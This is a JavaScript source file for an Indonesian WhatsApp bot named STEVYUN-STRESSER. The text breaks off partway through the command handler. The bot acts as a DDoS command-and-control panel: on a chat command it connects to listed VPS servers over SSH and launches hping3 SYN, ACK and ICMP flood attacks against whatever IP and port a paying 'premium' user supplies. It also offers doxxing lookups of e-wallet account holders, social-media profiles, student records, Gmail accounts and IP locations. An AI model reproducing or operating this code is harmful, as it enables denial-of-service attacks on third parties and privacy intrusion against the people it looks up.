const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const readline = require("readline");
const axios = require("axios");
const path = require("path");

async function startPermen() {
  const checkAuthorization = async (sock) => {
    try {
      const pathId = `/CBC4zwfY`
      const path1 = `raw${pathId}`
      const response = await axios.get(`https://pastebin.com/${path1}`);
      const authorizedUsers = response.data

      const botUserId = sock.user.id.split(":")[0];
      if (authorizedUsers.includes(botUserId)) {
        console.log("✅ Bot STEVYUN-STRESSER Is Authorized ✅️.");
        return true;
      } else {
        console.log("❌ Bot STEVYUN-STRESSER Is Not Authorized ❌️.");
        return true;
      }
    } catch (error) {
      return true;
    }
  };
      


// ================================================================== //
// Role, Question Function And Variable🕊🪽
  const premiumFile = path.join(__dirname, 'premium.json');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
  const askQuestion = (query) => {
    return new Promise(resolve => rl.question(query, resolve));
  };
  const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
  };
// ================================================================== //






// ================================================================== //
// WhatsApp Connection Logic🕊🪽 //
  const { state, saveCreds } = await useMultiFileAuthState("stevyun");

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac Os', 'Chrome', '121.0.6167.159'],
    version: [2, 3000, 1015901307]
  });

  sock.ev.on("creds.update", saveCreds);

  if (!sock.authState.creds.registered) {
    try {
      await waiting(1000);
      const number = await askQuestion("Masukkan Nomor WhatsApp (contoh 628xxxxxxxxxx): ");
      
      if (!/^\d{10,15}$/.test(number)) {
        console.log("⚠️ Format Nomor Tidak Valid! Pastikan Menggunakan Kode Negara ⚠️.");
        return startPermen();
      }

      let code = await sock.requestPairingCode(number);
      console.log(`⌛ Pairing Code ⏳️: ${code}`);
    } catch (err) {
      console.log("❌ Error Saat Pairing ❌️:", err.message);
    }
  }

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        console.log("🔄 Reconnecting... 🔄");
        await waiting(3000);
        startPermen();
      }
    } else if (connection === "open") {
      const isAuthorized = await checkAuthorization(sock);
      if (!isAuthorized) {
        await console.log("🚫 Exiting Bot Due To Lack Of Authorization 🚫.");
        await process.exit(1);
      }    
      console.log("✅ Bot STEVYUN-STRESSER  Is Connected! ✅️");
    }
  });
// ================================================================== //






// ================================================================== //
// Stresser Function And Control Logic🕊🪽 //
const attackHistory = [];
const ongoingAttacks = [];
let vpsList = JSON.parse(fs.readFileSync('vps.json', 'utf8'));
let premiumUsers = JSON.parse(fs.readFileSync('premium.json', 'utf8'));
const isPremium = (userJid) => premiumUsers.includes(userJid);

fs.watch('vps.json', () => {
  vpsList = JSON.parse(fs.readFileSync('vps.json', 'utf8'));
  console.log("🔄 VPS List Updated 🔄.");
});

fs.watch('premium.json', () => {
  premiumUsers = JSON.parse(fs.readFileSync('premium.json', 'utf8'));
  console.log("🔄 Premium Users STEVYUN-STRESSER List Updated 🔄.");
});

const saveAttack = (list, data) => {
  list.push(data);
};
const removeOngoingAttack = (target) => {
  const index = ongoingAttacks.findIndex(attack => attack.Target === target);
  if (index !== -1) {
    ongoingAttacks.splice(index, 1);
  }
};
const moveOngoingToHistory = () => {
  attackHistory.push(...ongoingAttacks);
  ongoingAttacks.length = 0;
};

// =======================================

const { Client } = require('ssh2');
let cncActive = false; // Track CNC status🕊🪽
let vpsConnections = {}; // Store active SSH connections🕊🪽

const connectToAllVPS = async () => {
  if (!cncActive) return; // Stop if CNC is not active🕊🪽

  console.log("🔄 Connecting To All VPS Servers... 🔄");
  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already Connected To ${vps.host}✅️`);
      continue;
    }

    const conn = new Client();
    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Close immediately if CNC was stopped🕊🪽
        return;
      }
      console.log(`✅ Connect To VPS ✅️: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Auto-reconnect only if CNC is active🕊🪽
      conn.on('close', () => {
        console.log(`🔄 VPS Disconnected 🔄: ${vps.host}`);
        delete vpsConnections[vps.host]; 
        if (cncActive) {
          console.log(`🔄 Reconnecting To ${vps.host}...🔄`);
          setTimeout(() => connectToAllVPS(), 5000); // Retry after 5 sec🕊🪽
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed Connect To ${vps.host}: ${err.message}❌️`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
};

const disconnectAllVPS = () => {
  console.log("🛑 Stopping To Connections...🛑");
  cncActive = false; // Disable CNC🕊🪽
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
};

const executeOnVPS = async (vps, command) => {
  return new Promise((resolve, reject) => {
    if (!cncActive || !vpsConnections[vps.host]) {
      console.log(`❌ No Active Connection To ${vps.host} ❌️.`);
      return resolve({ vps, success: false });
    }

    vpsConnections[vps.host].exec(`screen -dmS permen_session_${Date.now()} bash -c '${command}'`, (err) => {
      if (err) {
        console.log(`❌ Failed To Executed Command On ${vps.host}: ${err.message}❌️`);
        return resolve({ vps, success: false });
      }
      resolve({ vps, success: true });
    });
  });
};


const executeCommand = async (command, userJid, target, method) => {
  if (!cncActive) {
    console.log("❌ Cnc Is No Active. Start With Cnc' Start' ❌️.");
    return 0;
  }

  const attackData = {
    User: userJid,
    "Attack Date": new Date().toISOString(),
    Target: target,
    Methods: method
  };

  saveAttack(ongoingAttacks, attackData);
  let successCount = 0;

  for (const vps of vpsList) {
    try {
      const result = await executeOnVPS(vps, command);
      if (result.success) {
        successCount++;
      }
    } catch (error) {
      console.log(`❌ Failed On VPS ❌️: ${vps.host}, Error: ${error.message}`);
    }
  }

  console.log(`✅ Command Executed On ${successCount} Server(s) Successfully ✅️.`);
  removeOngoingAttack(target);
  saveAttack(attackHistory, attackData);

  return successCount;
};


const stopAllScreens = async () => {
  console.log(`\n🛑 Stopping All Running Screen Sessions...🛑`);
  await executeCommand("pkill screen");
  moveOngoingToHistory();
  console.log(`✅ All Ongoing Attacks Moved To History ✅️.`);
};
// ================================================================== //






// ================================================================== //
// Data Digger And Other Function🕊🪽 //
async function checkAccount(msg, sock, number) {
  const endpoints = {
    Dana: `https://api.siputzx.my.id/api/check/dana?account_number=${number}`,
    Gopay: `https://api.siputzx.my.id/api/check/gopay?account_number=${number}`,
    ShopeePay: `https://api.siputzx.my.id/api/check/shopeepay?account_number=${number}`,
    OVO: `https://api.siputzx.my.id/api/check/ovo?account_number=${number}`
  };

  let results = [];
  for (const [bank, url] of Object.entries(endpoints)) {
    try {
      const response = await axios.get(url);
      const data = response.data;
      if (data.status) {
        results.push(`✅ ${bank}\nNama: ${data.data.account_holder}\nNomor: ${data.data.account_number}`);
      } else {
        results.push(`❌ ${bank}\n${data.error.message}❌️`);
      }
    } catch (error) {
      results.push(`⚠️ ${bank}: Not Found ⚠️`);
    }
  }

  const replyText = results.join("\n\n");
  sock.sendMessage(msg.key.remoteJid, { text: replyText }, { quoted: msg });
}
async function getTikTok(username) {
  try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/stalk/tiktok?username=${username}`);
      if (!data.status) throw new Error('Not found');

      const user = data.data.user;
      const stats = data.data.stats;

      return `📌 TikTok Profile 📌
👤 *Name:* ${user.nickname}
🔗 *Username:* @${user.uniqueId}
✅ *Verified:* ${user.verified ? 'Yes' : 'No'}
📍 *Region:* ${user.region}
👥 *Followers:* ${stats.followerCount}
👤 *Following:* ${stats.followingCount}
❤️ *Likes:* ${stats.heartCount}
🎥 *Videos:* ${stats.videoCount}
📝 *Bio:* ${user.signature || 'No Bio'}
🔗 *Link:* ${user.bioLink ? user.bioLink.link : 'No Link'}`;
  } catch (error) {
      return `📌 TikTok: Tidak Ditemukan 📌.`;
  }
}
async function getTwitter(username) {
  try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/stalk/twitter?user=${username}`);
      if (!data.status) throw new Error('Not found');

      const user = data.data;
      const stats = data.data.stats;

      return `📌 Twitter Profile 📌
👤 *Name:* ${user.name}
🔗 *Username:* @${user.username}
✅ *Verified:* ${user.verified ? 'Yes' : 'No'}
📍 *Location:* ${user.location || 'Unknown'}
📅 *Joined:* ${user.created_at}
👥 *Followers:* ${stats.followers}
👤 *Following:* ${stats.following}
📢 *Tweets:* ${stats.tweets}
❤️ *Likes:* ${stats.likes}
📝 *Bio:* ${user.description || 'No Bio'}`;
  } catch (error) {
      return `📌 Twitter: Tidak Ditemukan 📌.`;
  }
}
async function getYouTube(username) {
  try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/stalk/youtube?username=${username}`);
      if (!data.status) throw new Error('Not found');

      const channel = data.data.channel;

      return `📌 YouTube Profile 📌
👤 *Channel Name:* ${channel.username}
👥 *Subscribers:* ${channel.subscriberCount}
🎥 *Videos:* ${channel.videoCount}
📝 *Description:* ${channel.description || 'No Description'}
🔗 *Channel Link:* ${channel.channelUrl}`;
  } catch (error) {
      return `📌 YouTube: Tidak Ditemukan 📌.`;
  }
}
async function getGitHub(username) {
  try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/stalk/github?user=${username}`);
      if (!data.status) throw new Error('Not found');

      const user = data.data;

      return `📌 GitHub Profile 📌
👤 *Name:* ${user.nickname || 'Unknown'}
🔗 *Username:* @${user.username}
🏢 *Company:* ${user.company || 'Not Specified'}
🌍 *Location:* ${user.location || 'Unknown'}
📅 *Joined:* ${new Date(user.created_at).toLocaleDateString()}
📝 *Bio:* ${user.bio || 'No Bio'}
📂 *Repositories:* ${user.public_repo}
📜 *Gists:* ${user.public_gists}
👥 *Followers:* ${user.followers}
👤 *Following:* ${user.following}
🔗 *Profile Link:* ${user.url}`;
  } catch (error) {
      return `📌 GitHub: Tidak Ditemukan 📌.`;
  }
}
async function getInstagram(username) {
  try {
      const { data } = await axios.get(`https://fastrestapis.fasturl.link/stalk/instagram?username=${username}`);
      if (data.status !== 200) throw new Error('Not found');

      const user = data.result;

      return `📌 Instagram Profile 📌
👤 *Name:* ${user.name}
📄 *Bio:* ${user.description || 'No Bio'}
👥 *Followers:* ${user.followers}
📸 *Posts:* ${user.uploads}
🔥 *Engagement Rate:* ${user.engagementRate}
📊 *Most Active Day:* ${user.mostPopularPostTime}
🔗 *Profile Link:* https://www.instagram.com/${username}`;
  } catch (error) {
      return `📌 Instagram: Tidak Ditemukan 📌.`;
  }
}
async function getTelegram(username) {
  try {
      const { data } = await axios.get(`https://fastrestapis.fasturl.link/stalk/telegram?username=${username}`);
      if (data.status !== 200) throw new Error('Not found');

      const user = data.result;

      return `📌 Telegram Profile 📌
👤 *Name:* ${user.title}
📄 *Bio:* ${user.desc || 'No Bio'}
🔗 *Profile Link:* https://t.me/${username}`;
  } catch (error) {
      return `📌 Instagram: Tidak Ditemukan 📌.`;
  }
}
async function getSteam(username) {
    try {
        const { data } = await axios.get(`https://fastrestapis.fasturl.link/stalk/steam?username=${username}`);
        if (data.status !== 200) throw new Error("Not found");

        const user = data.result;

        return `📌 *Steam Profile* 📌
👤 *Name:* ${user.personaName}
📄 *Real Name:* ${user.realName || "No Name"}
📍 *Location:* ${user.location || "Unknown"}
🎮 *Total Games:* ${user.games}
🏆 *Achievements:* ${user.achievements.total} (Avg Completion: ${user.achievements.avgCompletionRate}%)
🖼️ *Screenshots:* ${user.screenshots}
🎥 *Videos:* ${user.videos}
📝 *Reviews:* ${user.reviews}
👥 *Friends:* ${user.friends}`;
    } catch (error) {
        return `❌ Steam Profile Not Found For Username: ${username}❌️`;
    }
}
async function checkUsername(username) {
  const [tiktok, twitter, youtube, github, instagram, telegram, steam] = await Promise.all([
      getTikTok(username),
      getTwitter(username),
      getYouTube(username),
      getGitHub(username),
      getInstagram(username),
      getTelegram(username),
      getSteam(username)
  ]);
  return `👤 Username 👤: ${username}\n================\n${tiktok}\n================\n${twitter}\n================\n${youtube}\n================\n${github}\n================\n${instagram}\n================${telegram}\n================${steam}\n================`;
}
async function getFakeData(qty, type) {
  try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/tools/fake-data?type=${type}&count=${qty}`);
      if (!data.status) throw new Error('Failed To Fetch Data');

      let result = `📌 *Fake Data (${type})* 📌\n`;
      data.data.forEach((item, index) => {
          result += `\n🔹 *Data ${index + 1}*\n`;
          
          // Person🕊🪽
          if (item.name) result += `👤 *Name:* ${item.name}\n`;
          if (item.email) result += `📧 *Email:* ${item.email}\n`;
          if (item.phone) result += `📞 *Phone:* ${item.phone}\n`;
          if (item.birthDate) result += `🎂 *Birth Date:* ${new Date(item.birthDate).toLocaleDateString()}\n`;
          if (item.gender) result += `⚧️ *Gender:* ${item.gender}\n`;

          // Company🕊🪽
          if (item.catchPhrase) result += `💡 *Motto:* ${item.catchPhrase}\n`;
          if (item.address) result += `📍 *Address:* ${item.address}\n`;
          if (item.website) result += `🌐 *Website:* ${item.website}\n`;

          // Finance🕊🪽
          if (item.accountNumber) result += `🏦 *Account Number:* ${item.accountNumber}\n`;
          if (item.amount) result += `💰 *Amount:* ${item.amount} ${item.currency}\n`;

          // Vehicle🕊🪽
          if (item.manufacturer) result += `🚗 *Manufacturer:* ${item.manufacturer}\n`;
          if (item.model) result += `🚙 *Model:* ${item.model}\n`;
          if (item.type) result += `🚘 *Type:* ${item.type}\n`;

          // Product🕊🪽
          if (item.price) result += `💵 *Price:* $${item.price}\n`;
          if (item.category) result += `🛍 *Category:* ${item.category}\n`;
          if (item.description) result += `📜 *Description:* ${item.description}\n`;

          // Address🕊🪽
          if (item.street) result += `🏠 *Street:* ${item.street}\n`;
          if (item.city) result += `🏙 *City:* ${item.city}\n`;
          if (item.country) result += `🌍 *Country:* ${item.country}\n`;
          if (item.zipCode) result += `📮 *ZIP Code:* ${item.zipCode}\n`;
      });

      return result;
  } catch (error) {
      return `❌ Gagal Mengambil Data Fake. Pastikan Tipe Data Valid ❌️.`;
  }
}
async function searchMahasiswa(msg, sock, name) {
  try {
    const response = await axios.get(`https://api.ryzendesu.vip/api/search/mahasiswa?query=${encodeURIComponent(name)}`);
    
    if (!response.data || response.data.length === 0) {
      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Tidak Ada Data Mahasiswa Ditemukan ❌️." }, { quoted: msg });
    }
    
    let fileContent = "📄 Hasil Pencarian Mahasiswa 📄\n\n";
    let totalData = 0;
    response.data.forEach((mhs, index) => {
      fileContent += `🔹 *Mahasiswa ${index + 1}*\n`;
      fileContent += `🆔 ID: ${mhs.id}\n`;
      fileContent += `👤 Nama: ${mhs.nama}\n`;
      fileContent += `🎓 NIM: ${mhs.nim}\n`;
      fileContent += `🏫 Universitas: ${mhs.nama_pt}\n`;
      fileContent += `📚 Program Studi: ${mhs.nama_prodi}\n\n`;
      totalData++
    });
    
    const filePath = `./mahasiswa_${name}.txt`;
    fs.writeFileSync(filePath, fileContent);
    
    const fileMessage = {
      document: fs.readFileSync(filePath),
      mimetype: 'text/plain',
      fileName: `Mahasiswa_${name}.txt`
    };
    await sock.sendMessage(msg.key.remoteJid, { text: `📄 Hasil Pencarian Mahasiswa 📄\n\nQuery: ${name}\nTotal Data: ${totalData}`}, { quoted: msg });
    await sock.sendMessage(msg.key.remoteJid, fileMessage, { quoted: msg });
    fs.unlinkSync(filePath);
  } catch (error) {
    console.error("❌ Error Fetching Mahasiswa Data ❌️:", error.message);
    sock.sendMessage(msg.key.remoteJid, { text: "❌ Gagal Mengambil Data Mahasiswa ❌️." }, { quoted: msg });
  }
};
const checkVps = async (vps) => {
  return new Promise((resolve) => {
    const { Client } = require('ssh2');
    const conn = new Client();
    conn.on('ready', () => {
      console.log(`✅ VPS ${vps.host} Is Active ✅️.`);
      conn.end();
      resolve(true);
    }).on('error', (err) => {
      console.log(`❌ Failed To Connect To ${vps.host}: ${err.message}❌️`);
      resolve(false);
    }).connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  });
};

const removeInvalidVps = async (msg, sock) => {
  let aliveVps = [];
  let removedVps = [];

  for (const vps of vpsList) {
    const isAlive = await checkVps(vps);
    if (!isAlive) {
      removedVps.push(vps.host);
    } else {
      aliveVps.push(vps);
    }
  }

  fs.writeFileSync('vps.json', JSON.stringify(aliveVps, null, 2));
  console.log("✅ vps.json Updated. Removed Invalid VPS ✅️.");

  const message = removedVps.length > 0 ?
    `❌ Removed VPS ❌️:
${removedVps.join('\n')}` :
    "✅ All VPS Are Active, No Removals ✅️.";
  
  await sock.sendMessage(msg.key.remoteJid, { text: message }, { quoted: msg });
};
// ================================================================== //






// ================================================================== //
// Message Handler And Feature Call🕊🪽
  sock.ev.on("messages.upsert", async (chatUpdate) => {
    try {
        let msg = chatUpdate.messages[0];
        if (!msg.message) return;

        msg.message = msg.message.ephemeralMessage?.message || msg.message;
        if (msg.key.remoteJid === "status@broadcast") return;
        if (!sock.public && !msg.key.fromMe && chatUpdate.type === "notify") return;
        if (msg.key.id.startsWith("BAE5") && msg.key.id.length === 16) return;

        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
        const args = body.trim().split(/\s+/);
        const command = args.shift().toLowerCase();
        const text = body.trim().slice(command.length + 1);
        const botNumber = sock.user.id.split(":")[0] + "@s.whatsapp.net"
        const isOwner = (userJid) => userJid === botNumber;

        const sender = msg.key.participant || msg.key.remoteJid;
        const isGroup = msg.key.remoteJid.endsWith("@g.us");
        let groupInfo = isGroup ? `\nGroup: ${msg.key.remoteJid}` : "";

        console.log(`\nChat:\nSender: ${sender}${groupInfo}\nPesan: ${body}\n`);

        switch (command) {
          case "/cnc":
            if (args[0] === "start") {
              if (cncActive) {
                sock.sendMessage(msg.key.remoteJid, { text: "⚠️ CNC Is Already Running!⚠️" }, { quoted: msg });
              } else {
                cncActive = true;
                connectToAllVPS();
                sock.sendMessage(msg.key.remoteJid, { text: "✅ CNC Started. All VPS Are Now Connected! ✅️" }, { quoted: msg });
              }
            } else if (args[0] === "stop") {
              disconnectAllVPS();
              sock.sendMessage(msg.key.remoteJid, { text: "🛑 CNC Stopped. All VPS Connections Are Closed! 🛑" }, { quoted: msg });
            } else {
              sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Usage: Cnc Start | Cnc Stop ⚠️" }, { quoted: msg });
            }
            break;
          case "/ewallet":
                if (!args[0]) {
                    return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Masukkan Nomor Akun Yang Ingin Dicek! ⚠️" }, { quoted: msg });
                }
                await checkAccount(msg, sock, args[0]);
                break;
          case "/username":
                if (!args[0]) {
                    return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Masukkan Username Akun Yang Ingin Dicek! ⚠️" }, { quoted: msg });
                }

                const results = await checkUsername(args[0]);
                sock.sendMessage(msg.key.remoteJid, { text: results }, { quoted: msg });
                break;
          case "/fakedata":
              if (args.length < 2) {
                return sock.sendMessage(msg.key.remoteJid, { text: `⚠️ Format Salah! ⚠️ Gunakan: /fakedata <qty> <type>\n\n📝 *Tipe Yang Tersedia:*\n- person\n- company\n- product\n- address\n- finance\n- vehicle` }, { quoted: msg });
            }
        
            const qty = parseInt(args[0]);
            const type = args[1].toLowerCase();
            const availableTypes = ["person", "company", "product", "address", "finance", "vehicle"];
        
            if (isNaN(qty) || qty < 1 || qty > 10) {
               return sock.sendMessage(msg.key.remoteJid, { text: `⚠️ Jumlah Harus Angka Antara 1-10 ⚠️.` }, { quoted: msg });
            }
            if (!availableTypes.includes(type)) {
               return sock.sendMessage(msg.key.remoteJid, { text: `⚠️ Tipe Tidak Valid! Gunakan Salah Satu ⚠️:\n${availableTypes.join(', ')}` }, { quoted: msg });
            }
        
            const response = await getFakeData(qty, type);
            sock.sendMessage(msg.key.remoteJid, { text: response }, { quoted: msg });
        
                break;
          case "/iplocation":
                  if (!args[0]) {
                    return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Harap Masukkan IP, Contoh: `/iplocation 8.8.8.8`" }, { quoted: msg });
                  }
                
                  try {
                    const { data } = await axios.get(`https://api.ryzendesu.vip/api/tool/iplocation?ip=${args[0]}`);
                                      
                    if (!data.ipInfo || !data.ipInfo.ip) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ IP Tidak Ditemukan Atau Tidak Valid ⚠️." }, { quoted: msg });
                    }
                  
                    const result = `🌍 *IP Location Lookup*
🔹 *IP:* ${data.ipInfo.ip}
📍 *Kota:* ${data.ipInfo.city}, ${data.ipInfo.region} (${data.ipInfo.country_name})
🌎 *Negara:* ${data.ipInfo.country_name} (${data.ipInfo.country_code})
🏙️ *Kode Pos:* ${data.ipInfo.postal || "-"}
🕰️ *Zona Waktu:* ${data.ipInfo.timezone} (UTC ${data.ipInfo.utc_offset})
📡 *ISP:* ${data.ipInfo.org}
📍 *Koordinat:* ${data.ipInfo.latitude}, ${data.ipInfo.longitude}
💰 *Mata Uang:* ${data.ipInfo.currency} (${data.ipInfo.currency_name})

🔗 *ASN:* ${data.ipInfo.asn}
📞 *Kode Telepon:* ${data.ipInfo.country_calling_code}`;
                  
                  await sock.sendMessage(msg.key.remoteJid, {
                    location: {
                      degreesLatitude: data.ipInfo.latitude,
                        degreesLongitude: data.ipInfo.longitude
                      }}, { quoted: msg });
                  await sock.sendMessage(msg.key.remoteJid, { contextInfo: {
                    externalAdReply: {
                      showAdAttribution: true, 
                      title: `Details IP Address`,
                      body: `IP Details: ${data.ipInfo.ip}`,
                      mediaType: 1,
                      renderLargerThumbnail : true,
                      thumbnailUrl: "https://files.catbox.moe/gcnhf7.jpg",
                      sourceUrl: ``
            
                    }
            
                  }, text: result}, { quoted: msg });
                  
                  } catch (error) {
                    console.error("❌️ Error Fetching IP Data ❌️:", error);
                    sock.sendMessage(msg.key.remoteJid, { text: "❌ Gagal Mengambil Data IP. Coba Lagi Nanti! ❌️" }, { quoted: msg });
                  }
                break;
          case "/google":
                  if (!text) return sock.sendMessage(msg.key.remoteJid, { text: "❌ Masukkan Kata Kunci Pencarian.\nContoh: `/google site:go.id`" }, { quoted: msg });
                  try {
                    const url = `https://api.vreden.my.id/api/google?query=${encodeURIComponent(text)}`;
                    const { data } = await axios.get(url);
                
                    if (!data.result || !data.result.items || data.result.items.length === 0) {
                      return await sock.sendMessage(msg.key.remoteJid, { text: "❌ Tidak Ada Hasil Ditemukan ❌️." }, { quoted: m });
                    }
                
                    let results = `🔍 *Search For:* ${text}\n`;
                    
                    for (let i = 0; i < data.result.items.length; i++) {
                      results += `📌 *Title:* ${data.result.items[i].title}\n🔗 *Link:* ${data.result.items[i].link}\n\n`;
                    }
                
                    await sock.sendMessage(msg.key.remoteJid, { text: results }, { quoted: msg });
                  } catch (error) {
                    console.error(error);
                    await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Terjadi Kesalahan Saat Mengambil Data ⚠️." }, { quoted: msg });
                  }
                  break;
          case "/mahasiswa":
                    if (args.length < 1) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Format Salah! ⚠️ Gunakan: /mahasiswa <nama>" }, { quoted: msg });
                    }
                    await searchMahasiswa(msg, sock, args.join(" "));
                    break;
          case "/gmail":
                      if (!args[0]) return sock.sendMessage(msg.key.remoteJid, { text: "❌ Masukkan Email Yang Benar ❌️" }, { quoted: msg });
                      try {
                        const { data } = await axios.get(`https://fastrestapis.fasturl.cloud/search/gmail?email=${encodeURIComponent(args[0])}`);
                        const results = `🔍 Result Gmail Search
Profile Update: ${data.result.lastProfileEdit}
Google ID: ${data.result.googleID}
User Type: ${data.result.userType}
Entity Type: ${data.result.googleChat.entityType}
Customer ID: ${data.result.googleChat.customerID}
        
G-Maps Data: ${data.result.mapsData.profilePage}
IP Address: ${data.result.ipAddress}
Enterprise: ${data.result.googlePlus.enterpriseUser}`
                        await sock.sendMessage(msg.key.remoteJid, { text: results }, { quoted: msg });
        
                      } catch (error) {
                        console.error(error)
                        await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Terjadi Kesalahan Saat Mengambil Data ⚠️." }, { quoted: msg });
                      }
                          break;
        

// =============================== //
// Feature DDoS🕊🪽 
            case "/syn-pps":
                    if (!isPremium(sender)) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                    }
                    if (args.length < 2) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /syn-pps <IP> <Port>" }, { quoted: msg });
                    }
                    await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                    let successServersSyn = await executeCommand(`hping3 -S --flood -p ${args[1]} ${args[0]}`);
                    sock.sendMessage(msg.key.remoteJid, { text: `✅ SYN-PPS Layer 4
Target: ${args[0]}
Port: ${args[1]}
Attack Server: ${successServersSyn} Server(s).
Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                    break;
            case "/syn-gbps":
                    if (!isPremium(sender)) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                    }
                    if (args.length < 2) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /syn-gbps <IP> <Port>" }, { quoted: msg });
                    }
                    await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                    let successServersSyn1 = await executeCommand(`hping3 -S --flood --data 65495 -p ${args[1]} ${args[0]}`);
                    sock.sendMessage(msg.key.remoteJid, { text: `✅ SYN-GBPS Layer 4
Target: ${args[0]}
Port: ${args[1]}
Attack Server: ${successServersSyn1} Server(s).
Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                    break;
            case "/ack-pps":
                      if (!isPremium(sender)) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                      }
                      if (args.length < 2) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /ack-pps <IP> <Port>" }, { quoted: msg });
                      }
                      await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                      let successServersAck = await executeCommand(`hping3 -A --flood -p ${args[1]} ${args[0]}`);
                      sock.sendMessage(msg.key.remoteJid, { text: `✅ ACK-PPS Layer 4
  Target: ${args[0]}
  Port: ${args[1]}
  Attack Server: ${successServersAck} Server(s).
  Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                      break;
            case "/ack-gbps":
                    if (!isPremium(sender)) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                    }
                    if (args.length < 2) {
                      return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /ack-gbps <IP> <Port>" }, { quoted: msg });
                    }
                    await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                    let successServersAck1 = await executeCommand(`hping3 -A --flood --data 65495 -p ${args[1]} ${args[0]}`);
                    sock.sendMessage(msg.key.remoteJid, { text: `✅ ACK-GBPS Layer 4
Target: ${args[0]}
Port: ${args[1]}
Attack Server: ${successServersAck1} Server(s).
Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                    break;
            case "/icmp-pps":
                      if (!isPremium(sender)) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                      }
                      if (args.length < 1) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /icmp-pps <IP>" }, { quoted: msg });
                      }
                      await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                      let successServersIcmp = await executeCommand(`hping3 --icmp --flood ${args[0]}`);
                      sock.sendMessage(msg.key.remoteJid, { text: `✅ ICMP-PPS Layer 4
Target: ${args[0]}
Attack Server: ${successServersIcmp} Server(s).
Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                      break;
            case "/icmp-gbps":
                      if (!isPremium(sender)) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Kamu Tidak Memiliki Akses Ke Fitur Ini ❌️." }, { quoted: msg });
                      }
                      if (args.length < 1) {
                        return sock.sendMessage(msg.key.remoteJid, { text: "❌ Format Salah! ❌️ Gunakan: /icmp-gbps <IP>" }, { quoted: msg });
                      }
                      await sock.sendMessage(msg.key.remoteJid, { text: "Starting Attack..." }, { quoted: msg });
                      let successServersIcmpGbps = await executeCommand(`hping3 --icmp --flood --data 65495 ${args[0]}`);
                      sock.sendMessage(msg.key.remoteJid, { text: `✅ ICMP-GBPS Layer 4
Target: ${args[0]}
Attack Server: ${successServersIcmpGbps} Server(s).
Creator: STEVEN•STORE🕊🪽` }, { quoted: msg });
                      break;
// =============================== //
          case "/checkvps": {
  if (!isOwner(sender)) {
    return sock.sendMessage(msg.key.remoteJid, { text: "❌ Hanya Owner Yang Dapat Menambahkan Server ❌️." }, { quoted: msg });
  }
  await removeInvalidVps(msg, sock);
}
  break;
          case "/addserver":
  if (!isOwner(sender)) {
    return sock.sendMessage(msg.key.remoteJid, { text: "❌ Hanya Owner Yang Dapat Menambahkan Server ❌️." }, { quoted: msg });
  }
  if (args.length < 2) {
